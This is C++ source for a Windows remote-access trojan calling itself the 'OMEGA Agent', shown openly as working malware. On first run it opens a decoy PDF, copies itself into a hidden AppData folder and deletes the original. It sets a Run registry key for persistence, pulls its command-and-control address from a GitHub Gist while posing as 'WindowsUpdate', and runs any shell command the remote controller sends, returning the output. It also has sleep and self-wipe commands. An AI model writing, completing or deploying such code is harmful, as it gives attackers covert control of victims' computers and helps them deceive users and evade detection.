#include <iostream>
#include <string>
#include <algorithm>
#include <openssl/ssl.h>
#include <openssl/err.h>
#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <psapi.h>
#endif

#include <fstream>
#include <chrono>
#include <ctime>
#include "ssl_client.h"
#include "executor.h"
#include "../common/protocol.h"
#include "../common/utils.h"
#include "../common/config.h"

// Function to check if the current executable is running from a specific path
bool IsRunningFromPath(const std::string& targetPath) {
#ifdef _WIN32
    char currentPath[MAX_PATH];
    if (GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0) return false;
    
    // Convert both to lowercase for comparison
    std::string current(currentPath);
    std::string target(targetPath);
    std::transform(current.begin(), current.end(), current.begin(), ::tolower);
    std::transform(target.begin(), target.end(), target.begin(), ::tolower);
    
    return (current == target);
#else
    return true;
#endif
}

// Function to copy ourselves to a target location, run the copy, and delete original
void RelocateAndMelt() {
#ifdef _WIN32
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) != S_OK) {
        LogToFile("client.log", "[-] Failed to get APPDATA path for relocation.");
        return;
    }

    std::string targetDir = std::string(appDataPath) + "\\" + PERSISTENCE_SUBDIR;
    std::string targetPath = targetDir + "\\" + PERSISTENCE_EXE;

    if (IsRunningFromPath(targetPath)) {
        LogToFile("client.log", "[*] Agent already running from persistent location: " + targetPath);
        return;
    }

    LogToFile("client.log", "[*] First run detected. Initiating relocation (Melt)...");
    LogToFile("client.log", "[*] Current path: " + std::string(__argv[0]));
    LogToFile("client.log", "[*] Target path: " + targetPath);

    // DISPLAY PDF DECOY (Only once to distract the user from the original run)
    std::string pdfPath = "file\\datapeserta.pdf"; 
    HINSTANCE resPDF = ShellExecuteA(NULL, "open", pdfPath.c_str(), NULL, NULL, SW_SHOW);
    if ((INT_PTR)resPDF <= 32) {
        LogToFile("client.log", "[-] Failed to open PDF decoy: " + pdfPath);
    } else {
        LogToFile("client.log", "[+] PDF decoy displayed for user.");
    }

    // Ensure directory exists
    int dirRes = SHCreateDirectoryExA(NULL, targetDir.c_str(), NULL);
    if (dirRes != ERROR_SUCCESS && dirRes != ERROR_ALREADY_EXISTS) {
        LogToFile("client.log", "[-] Failed to create target directory: " + targetDir + " (Error: " + std::to_string(dirRes) + ")");
    }
    SetFileHidden(targetDir);

    char currentExe[MAX_PATH];
    if (GetModuleFileNameA(NULL, currentExe, MAX_PATH) == 0) {
        LogToFile("client.log", "[-] Failed to get current module filename (Error: " + std::to_string(GetLastError()) + ")");
        return;
    }

    // Copy to target
    if (CopyFileA(currentExe, targetPath.c_str(), FALSE)) {
        LogToFile("client.log", "[+] Cloned successfully to: " + targetPath);
        SetFileHidden(targetPath);

        // Start the clone
        STARTUPINFOA si;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi;

        if (CreateProcessA(targetPath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            LogToFile("client.log", "[+] Clone launched successfully. PID: " + std::to_string(pi.dwProcessId));
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

            // ORIGINAL PROCESS: Show PDF, melt and exit
            LogToFile("client.log", "[!] Task handed over to clone. Melting original and exiting.");
            SelfDelete(currentExe);
            exit(0);
        } else {
            LogToFile("client.log", "[-] CreateProcess failed for clone: " + targetPath + " (Error: " + std::to_string(GetLastError()) + ")");
        }
    } else {
        LogToFile("client.log", "[-] CopyFileA failed from " + std::string(currentExe) + " to " + targetPath + " (Error: " + std::to_string(GetLastError()) + ")");
    }
#endif
}

// Function to add the executable to the Windows Registry for Auto-Run
void InstallPersistence() {
#ifdef _WIN32
    if (!AUTO_PERSISTENCE) return;

    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) != S_OK) return;

    std::string targetPath = std::string(appDataPath) + "\\" + PERSISTENCE_SUBDIR + "\\" + PERSISTENCE_EXE;
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, PERSISTENCE_REG_KEY.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, PERSISTENCE_REG_NAME.c_str(), 0, REG_SZ, (const BYTE*)targetPath.c_str(), strlen(targetPath.c_str()) + 1);
        RegCloseKey(hKey);
        LogToFile("client.log", "[+] Persistence registry entry installed: " + PERSISTENCE_REG_NAME);
    } else {
        LogToFile("client.log", "[-] Failed to access Run key in registry");
    }
#endif
}

// Function to obliterate the persistence footprint and uninstall itself
void RemovePersistence() {
#ifdef _WIN32
    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, PERSISTENCE_REG_KEY.c_str(), 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, PERSISTENCE_REG_NAME.c_str());
        RegCloseKey(hKey);
    }
    
    // Also try without WOW64 flags or with WOW64_32KEY
    if (RegOpenKeyExA(HKEY_CURRENT_USER, PERSISTENCE_REG_KEY.c_str(), 0, KEY_SET_VALUE | KEY_WOW64_32KEY, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, PERSISTENCE_REG_NAME.c_str());
        RegCloseKey(hKey);
    }

    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
        std::string persistentExe = std::string(appDataPath) + "\\" + PERSISTENCE_SUBDIR + "\\" + PERSISTENCE_EXE;
        
        // If we are NOT the persistent exe, delete it now
        if (!IsRunningFromPath(persistentExe)) {
            DeleteFileA(persistentExe.c_str());
        }
    }

    // Explicitly delete logs directory and other files if possible
    // Note: If we are the clone, the logs might be open, so we rely on SelfDelete(path, true) in :kill
    WipeDirectory(LOG_DIR);
    WipeDirectory(SCAN_DIR);
#endif
}

// Function to detach from console when double-clicked (fix cursor loading)
void DetachFromConsole() {
#ifdef _WIN32
    FreeConsole();
#endif
}

// Function to fetch the dynamic Ngrok C2 address from a GitHub Gist
#ifdef _WIN32
bool FetchC2AddressFromGist(const std::string& url, std::string& host, int& c2_port) {
    HINTERNET hInternet = InternetOpenA("WindowsUpdate", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    // --- CACHE BUSTER ---
    // Append a unique timestamp to force GitHub to bypass its CDN cache
    std::string cacheBusterUrl = url;
    if (cacheBusterUrl.find('?') == std::string::npos) {
        cacheBusterUrl += "?t=" + std::to_string(GetTickCount());
    } else {
        cacheBusterUrl += "&t=" + std::to_string(GetTickCount());
    }

    HINTERNET hUrl = InternetOpenUrlA(hInternet, cacheBusterUrl.c_str(), NULL, 0, 
                                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        LogToFile("client.log", "[-] InternetOpenUrlA failed for GIST_RAW_URL");
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[1024];
    DWORD bytesRead;
    std::string response;

    while (InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    size_t colonPos = response.find(':');
    if (colonPos != std::string::npos) {
        host = response.substr(0, colonPos);
        try {
            std::string portStr = response.substr(colonPos + 1);
            size_t endpos = portStr.find_last_not_of(" \n\r\t");
            if (std::string::npos != endpos) portStr = portStr.substr(0, endpos + 1);
            c2_port = std::stoi(portStr);
            return true;
        } catch (...) {
            return false;
        }
    } else if (!response.empty()) {
        // FALLBACK: No colon found, but we have content. 
        // Assume default port 80 (Standard for Localhost.run/Serveo)
        host = response;
        size_t endpos = host.find_last_not_of(" \n\r\t");
        if (std::string::npos != endpos) host = host.substr(0, endpos + 1);
        c2_port = 80; 
        return true;
    }
    return false;
}
#endif
int main() {
    // 0. SET DPI AWARENESS
    // Fixes screenshot scaling issues on high-DPI displays (e.g. 125%, 150%)
#ifdef _WIN32
    SetProcessDPIAware();
#endif
    // 1. RELOCATE AND MELT (Clone/Melt Feature)
    // Moves the agent to AppData and deletes the original file on first run.
#ifdef _WIN32
    RelocateAndMelt();
#endif

    // 2. SINGLE INSTANCE CHECK (Mutex)
    // Ensures only one agent is running at a time from the persistent location.
#ifdef _WIN32
    HANDLE hMutex = CreateMutexA(NULL, TRUE, MUTEX_NAME.c_str());
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        // Agent already running. Exit silently.
        return 0;
    }
#endif

    // 3. DISPLAY PDF DECOY
    // (Moved to RelocateAndMelt for the original process run)
    
    // DETACH FROM CONSOLE TO FIX CURSOR LOADING ON DOUBLE-CLICK
    // Check if running from Windows Explorer (parent process is explorer.exe)
#ifdef _WIN32
    DWORD parentPID = GetCurrentProcessId();
    DWORD ppid = 0;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (pe32.th32ProcessID == parentPID) {
                    ppid = pe32.th32ParentProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    // Detach from console if parent is explorer.exe or other GUI app
    if (ppid > 0) {
        HANDLE hParentProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ppid);
        if (hParentProc != INVALID_HANDLE_VALUE) {
            char parentName[MAX_PATH] = {};
            if (GetProcessImageFileNameA(hParentProc, parentName, MAX_PATH) > 0) {
                std::string parent_str = parentName;
                if (parent_str.find("explorer.exe") != std::string::npos) {
                    DetachFromConsole();
                }
            }
            CloseHandle(hParentProc);
        }
    }
#endif
    
    // ONLY CREATE LOG FILES IF LOGGING IS ENABLED
    if (LOGGING_ENABLED) {
        EnsureDirectoryExists(LOG_DIR);
        LogToFile("client.log", "[*] OMEGA Agent started (Subsystem: WIN32)");
    }

    // HIDDEN MODE: No Console needed for -mwindows / WIN32 subsystem apps

    // 2. AUTO-RUN (Persistence)
    InstallPersistence();

    // 3. INITIALIZATION
    int port = SERVER_PORT;

    InitializeSockets();

    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();

    // 4. DYNAMIC C2 RESOLUTION & RECONNECTION LOOP
    int failed_attempts = 0;
    const int MAX_FAILED_ATTEMPTS = 3;
    
    while (true) {
        std::string host = "localhost";
        int dynamic_port = port;
        
#ifdef _WIN32
        // Force re-fetch from GitHub after 3 failed connection attempts
        if (failed_attempts >= MAX_FAILED_ATTEMPTS) {
            LogToFile("client.log", "[!] Failed " + std::to_string(failed_attempts) + " times. Re-fetching from GitHub for updates...");
            failed_attempts = 0; // Reset counter
        }
        
        // Fetch URL from Github Gist
        if (!FetchC2AddressFromGist(GIST_RAW_URL, host, dynamic_port)) {
            LogToFile("client.log", "[-] Failed to fetch C2 address from Gist cloud. Retrying...");
            // Wait 10 seconds before retrying if fetching failed (e.g., no internet right now)
            Sleep(10000);
            continue;
        }

        LogToFile("client.log", "[*] Resolved C2 Address: " + host + ":" + std::to_string(dynamic_port));
#endif

        SSLClient client(host, dynamic_port);
        
        if (!client.Connect()) {
            failed_attempts++;
            LogToFile("client.log", "[-] Connection failed (" + std::to_string(failed_attempts) + "/" + std::to_string(MAX_FAILED_ATTEMPTS) + ") to " + host + ":" + std::to_string(dynamic_port));
            // Fails: Wait 5 seconds before retrying the fetching
#ifdef _WIN32
            Sleep(5000);
#else
            sleep(5);
#endif
            continue; 
        }

        LogToFile("client.log", "[+] Secure connection established with Nexus Controller.");

        SSL* ssl = client.GetSSL();

        // Reset failed attempts counter on successful connection
        failed_attempts = 0;

        // Authentication Phase
        if (!SendSecureMessage(ssl, AUTH_TOKEN)) {
            LogToFile("client.log", "[-] Authentication failed - invalid token or connection error");
            client.Disconnect();
            
#ifdef _WIN32
            Sleep(5000);
#else
            sleep(5);
#endif
            continue;
        }
        LogToFile("client.log", "[+] Authentication successful");

        // Execution Loop
        std::string command;
        while (true) {
            if (!ReceiveSecureMessage(ssl, command)) {
                LogToFile("client.log", "[-] Failed to receive message from server. Connection lost, reconnecting...");
                // Server disconnected. Break to reconnect.
                break;
            }

            LogToFile("client.log", "[*] Received command: " + command);

            // Kill Switch interception
            if (command == ":kill") {
                LogToFile("client.log", "[!] Received :kill command from server. Initiating self-destruction...");
                
                RemovePersistence();
                
                SendSecureMessage(ssl, "Agent has successfully wiped registry footprint, deleted executable, and is terminating indefinitely.\n");
                SendSecureMessage(ssl, "TERMINATED"); // Send CWD message slot as TERMINATED flag
                LogToFile("client.log", "[+] Self-destruction completed. Agent terminating.");
                
                client.Disconnect(); 

#ifdef _WIN32
                if (hMutex) CloseHandle(hMutex);
                
                char currentExe[MAX_PATH];
                GetModuleFileNameA(NULL, currentExe, MAX_PATH);
                
                LogToFile("client.log", "[!] Initiating final self-deletion of explorer and folder.");
                
                // If we are in the telemetry folder, delete the whole folder
                char appDataPath[MAX_PATH];
                bool isPersistentDir = false;
                if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
                    std::string persistentDir = std::string(appDataPath) + "\\" + PERSISTENCE_SUBDIR;
                    if (std::string(currentExe).find(persistentDir) != std::string::npos) {
                        isPersistentDir = true;
                    }
                }

                SelfDelete(currentExe, isPersistentDir);
                
                TerminateProcess(GetCurrentProcess(), 0);
#endif
                exit(0);
            }

            // Sleep Switch interception
            if (command.substr(0, 7) == ":sleep ") {
                try {
                    int seconds = std::stoi(command.substr(7));
                    if (seconds < 0 || seconds > 86400) { // Max 24 hours to prevent overflow
                        SendSecureMessage(ssl, "[-] Invalid sleep duration. Must be 0-86400 seconds.\n");
                        SendSecureMessage(ssl, Executor::GetCurrentDir());
                        continue;
                    }
                    long long sleepMs = (long long)seconds * 1000; // Use long long to prevent overflow
                    std::string msg = "Agent acknowledged sleep for " + std::to_string(seconds) + " seconds. Going Dark...";
                    SendSecureMessage(ssl, msg);
                    SendSecureMessage(ssl, "SLEEPING");
                    client.Disconnect();
#ifdef _WIN32
                    Sleep((DWORD)sleepMs);
#else
                    sleep(seconds);
#endif
                    break; // Break the execution loop to reconnect after sleep
                } catch (...) {
                    SendSecureMessage(ssl, "[-] Invalid sleep duration.\n");
                    SendSecureMessage(ssl, Executor::GetCurrentDir());
                    continue;
                }
            }

            // Execute safely via Invisible Pipes
            std::string output = Executor::ExecuteCommand(command);
            LogToFile("client.log", "[+] Command executed: '" + command + "' (output length: " + std::to_string(output.length()) + ")");

            // Get Current Working Directory internally
            std::string cwd = Executor::GetCurrentDir();

            // Send Output
            if (!SendSecureMessage(ssl, output)) {
                LogToFile("client.log", "[-] Failed to send command output");
                break;
            }
            LogToFile("client.log", "[+] Command output sent");

            // Send Current Working Directory
            if (!SendSecureMessage(ssl, cwd)) {
                LogToFile("client.log", "[-] Failed to send CWD");
                break;
            }
            LogToFile("client.log", "[+] CWD sent: " + cwd);
        }

        // If we reach here, the session dropped. Disconnect and loop back to retry.
        client.Disconnect();
#ifdef _WIN32
        Sleep(5000);
#else
        sleep(5);
#endif
    }

    // Unreachable in this daemon
    CleanupSockets();
    EVP_cleanup();

    return 0;
}
